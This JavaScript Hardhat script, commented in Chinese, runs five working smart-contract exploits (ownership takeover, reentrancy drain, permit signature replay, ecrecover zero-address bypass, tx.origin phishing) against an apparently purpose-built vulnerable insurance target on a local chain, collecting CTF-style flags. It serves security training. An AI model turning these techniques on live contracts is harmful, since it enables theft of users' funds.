/* Aegis 神盾 · 链上真实交易攻击（打靶场合约层）
 * ------------------------------------------------------------
 * 全部为真实交易：真实私钥签名 → 本地 EVM 链执行 → 真实 tx hash / gas / 事件。
 * 覆盖靶机合约层 4 条漏洞链：
 *   SC-1 未保护 initialize()      → 抢注 owner
 *   SC-2 withdraw() 重入 + unchecked → 抽干保险池
 *   SC-3 permit() 无 nonce/deadline → 签名重放
 *   SC-4 ecrecover 返回 0          → 垃圾签名通过核赔
 *   SC-5 tx.origin 鉴权            → 钓鱼合约绕过
 *
 * 用法（需在 insure-target 目录下用 hardhat 运行，以便编译攻击合约）：
 *   cd insure-target && npx hardhat run ../ComputeShield/scripts/chain-attack.js --network localhost
 */
'use strict';
const fs = require('node:fs');
const path = require('node:path');
/* hardhat 装在靶机工程里，这里做一次兜底解析，保证 npm run chain-attack 直接可用 */
const INSURE_DIR = process.env.INSURE_DIR || path.join(__dirname, '..', '..', 'insure-target');
let hre;
try { hre = require('hardhat'); }
catch (e) { hre = require(path.join(INSURE_DIR, 'node_modules', 'hardhat')); }
const { ethers } = hre;

/* Hardhat Network 默认账户 #0~#4 —— 官方文档公开的确定性测试私钥，仅用于本地开发链，
   主网/测试网余额为 0，不构成任何资产风险。
   说明：本地链做签名重放攻击演示必须持有私钥，hardhat 又不暴露 signer 私钥，故只能显式给出；
   这些是公开常量，**不是本项目的密钥**。项目真实私钥只放在本机 .env（已被 .gitignore 忽略）。
   参考：https://hardhat.org/hardhat-network/docs/reference#accounts */
const KEYS = [
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
  '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a',
  '0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6',
  '0x47e179ec197488593b187f80a00eb0da91f1b9d0b13f8733639f9c30d757438',
];

const DEP_FILE = process.env.DEP_FILE || path.join(INSURE_DIR, 'deployments.json');
const DEP = JSON.parse(fs.readFileSync(DEP_FILE, 'utf8'));

const T = [];   // 交易台账
function tx(step, label, rc, extra) {
  T.push({ step, label, hash: rc && rc.hash, gas: rc && rc.gasUsed ? Number(rc.gasUsed) : 0, block: rc && rc.blockNumber, ...extra });
  console.log(`    tx ${label}  gas=${rc && rc.gasUsed ? Number(rc.gasUsed) : '-'}  ${rc && rc.hash ? rc.hash.slice(0, 14) + '…' : ''}`);
}

/* 从回执里取 FlagEmitted 事件 */
function flagsFrom(contract, rc) {
  const out = [];
  for (const l of (rc && rc.logs) || []) {
    try { const p = contract.interface.parseLog(l); if (p && p.name === 'FlagEmitted') out.push({ tag: p.args[0], flag: p.args[1] }); } catch (e) { }
  }
  return out;
}

const R = { steps: [], flags: [], txs: T };

(async () => {
  const signers = await hre.ethers.getSigners();
  const [owner, alice, bob, carol, dave] = signers;
  const attacker = dave;                                  // 攻击者：与投保人/owner 均不同
  const atkKey = KEYS[4];
  const fmt = (w) => ethers.formatEther(w);

  const pool = await hre.ethers.getContractAt('InsurancePool', DEP.contracts.InsurancePool);
  const nft = await hre.ethers.getContractAt('PolicyNFT', DEP.contracts.PolicyNFT);
  const cm = await hre.ethers.getContractAt('ClaimManager', DEP.contracts.ClaimManager);

  console.log('链:', (await hre.ethers.provider.getNetwork()).chainId, '  攻击者:', attacker.address);
  console.log('  InsurancePool', DEP.contracts.InsurancePool, ' 池内', fmt(await pool.poolBalance()), 'ETH\n');

  /* ── SC-1 未保护 initialize ── */
  console.log('── SC-1  未保护 initialize() 抢注 owner ──');
  if (!(await pool.initialized())) {
    const rc = await (await pool.connect(attacker).initialize(attacker.address)).wait();
    tx('SC-1', 'initialize(attacker)', rc);
    console.log('    owner 已被抢注为', await pool.owner());
    R.flags.push(...flagsFrom(pool, rc));
  } else {
    console.log('    （合约已初始化，跳过）');
  }
  R.steps.push({ id: 'SC-1', name: '未保护 initialize', ok: (await pool.owner()) === attacker.address, detail: `owner=${await pool.owner()}` });

  /* ── SC-2 重入抽干保险池 ── */
  console.log('\n── SC-2  withdraw() 重入 + unchecked 抽干保险池 ──');
  const before = await pool.poolBalance();
  const Attacker = await hre.ethers.getContractFactory('ReentrancyAttacker', attacker);
  const atk = await Attacker.connect(attacker).deploy(DEP.contracts.InsurancePool);
  await atk.waitForDeployment();
  console.log('    攻击合约', atk.target);
  const rcA = await (await atk.connect(attacker).attack({ value: ethers.parseEther('1') })).wait();
  tx('SC-2', 'attack() 1 ETH 本金', rcA, { note: '递归 withdraw' });
  const after = await pool.poolBalance();
  const drained = await pool.isDrained();
  console.log(`    池内 ${fmt(before)} → ${fmt(after)} ETH · 账面已提 ${fmt(await pool.totalWithdrawn())} · isDrained=${drained}`);
  if (drained) {
    const rcF = await (await pool.connect(attacker).claimReentrancyFlag()).wait();
    tx('SC-2', 'claimReentrancyFlag()', rcF);
    R.flags.push(...flagsFrom(pool, rcF));
  }
  const rcC = await (await atk.connect(attacker).collect(attacker.address)).wait();
  tx('SC-2', 'collect() 提走赃款', rcC);
  R.steps.push({
    id: 'SC-2', name: '重入抽干保险池', ok: drained,
    detail: `池内 ${fmt(before)} → ${fmt(after)} ETH，攻击合约递归深度 ${await atk.depth()}`,
    stolen: fmt(before - after),
  });

  /* ── SC-3 permit 签名重放 ── */
  console.log('\n── SC-3  permit() 无 nonce/deadline → 签名重放 ──');
  const spender = attacker.address, value = 5000n;
  const nonce = await nft.nonces(alice.address);
  const digest = ethers.keccak256(
    ethers.solidityPacked(['address', 'address', 'uint256', 'uint256'], [alice.address, spender, value, nonce]));
  // 合约用裸 ecrecover(digest)，无 EIP-191 前缀 → 必须用 SigningKey 直接签裸摘要
  const sig = new ethers.SigningKey(KEYS[1]).sign(digest);
  const rcP1 = await (await nft.connect(bob).permit(alice.address, spender, value, sig.v, sig.r, sig.s)).wait();
  tx('SC-3', 'permit() 第 1 次', rcP1);
  const rcP2 = await (await nft.connect(bob).permit(alice.address, spender, value, sig.v, sig.r, sig.s)).wait();
  tx('SC-3', 'permit() 第 2 次（同一签名重放）', rcP2);
  const nonceAfter = await nft.nonces(alice.address);
  const allowance = await nft.allowance(alice.address, spender);
  console.log(`    nonce ${nonce} → ${nonceAfter}（未递增）· allowance=${allowance}`);
  const rcT = await (await nft.connect(attacker).transferFrom(alice.address, attacker.address, value)).wait();
  tx('SC-3', 'transferFrom() 用重放来的授权划走额度', rcT);
  R.steps.push({
    id: 'SC-3', name: 'permit 签名重放', ok: nonce === nonceAfter,
    detail: `同一签名两次生效，nonce 恒为 ${nonceAfter}，攻击者取得 ${value} 额度`,
  });

  /* ── SC-4 ecrecover 返回 address(0) ── */
  console.log('\n── SC-4  ecrecover 未校验 address(0) → 垃圾签名核赔通过 ──');
  const badHash = ethers.keccak256(ethers.toUtf8Bytes('aegis-garbage'));
  const rcE = await (await cm.connect(attacker).approveClaim(99, badHash, 27,
    '0x' + '11'.repeat(32), '0x' + '22'.repeat(32))).wait();
  tx('SC-4', 'approveClaim() 垃圾签名', rcE);
  const approved = await cm.approved(99);
  console.log(`    claim #99 approved=${approved} · 金额=${(await cm.claimAmount(99)).toString()}`);
  R.flags.push(...flagsFrom(cm, rcE));
  R.steps.push({ id: 'SC-4', name: 'ecrecover 零地址绕过', ok: approved, detail: `claim #99 被垃圾签名核赔通过，金额 ${(await cm.claimAmount(99)).toString()}` });

  /* ── SC-5 tx.origin 鉴权绕过 ── */
  console.log('\n── SC-5  tx.origin 鉴权 → 钓鱼合约绕过 ──');
  const Phish = await hre.ethers.getContractFactory('PhishingContract', attacker);
  const phish = await Phish.connect(attacker).deploy(DEP.contracts.ClaimManager);
  await phish.waitForDeployment();
  console.log('    钓鱼合约', phish.target, '（owner 被诱导调用）');
  const rcPh = await (await phish.connect(owner).innocentLookingCall(7, ethers.parseEther('9999'))).wait();
  tx('SC-5', 'owner 调用 innocentLookingCall()', rcPh);
  const amountSet = await cm.claimAmount(7);
  console.log(`    claim #7 金额被改为 ${fmt(amountSet)} ETH（tx.origin=${owner.address} 通过鉴权）`);
  const rcTO = await (await cm.connect(attacker).claimTxOriginFlag()).wait();
  tx('SC-5', 'claimTxOriginFlag()', rcTO);
  R.flags.push(...flagsFrom(cm, rcTO));
  R.steps.push({ id: 'SC-5', name: 'tx.origin 鉴权绕过', ok: amountSet > 0n, detail: `claim #7 金额被钓鱼合约改为 ${fmt(amountSet)} ETH` });

  /* ── 汇总 ── */
  console.log('\n════ 链上真实攻击汇总 ════');
  R.steps.forEach(s => console.log(`  ${s.ok ? '✓' : '✗'} ${s.id} ${s.name.padEnd(22)} ${s.detail}`));
  console.log(`\n  合约层 flag ${R.flags.length} 个：`);
  R.flags.forEach(f => console.log(`    ${f.tag.padEnd(24)} ${f.flag}`));
  console.log(`\n  真实交易 ${T.length} 笔，累计 gas ${T.reduce((a, t) => a + t.gas, 0)}`);

  const outDir = path.join(__dirname, '..', 'reports');
  fs.mkdirSync(outDir, { recursive: true });
  fs.writeFileSync(path.join(outDir, 'chain-attack.json'),
    JSON.stringify({ at: new Date().toISOString(), chainId: 31337, contracts: DEP.contracts, ...R }, null, 2));
  console.log(`\n  台账已写入 ${path.join(outDir, 'chain-attack.json')}`);
})().catch(e => { console.error(e); process.exitCode = 1; });
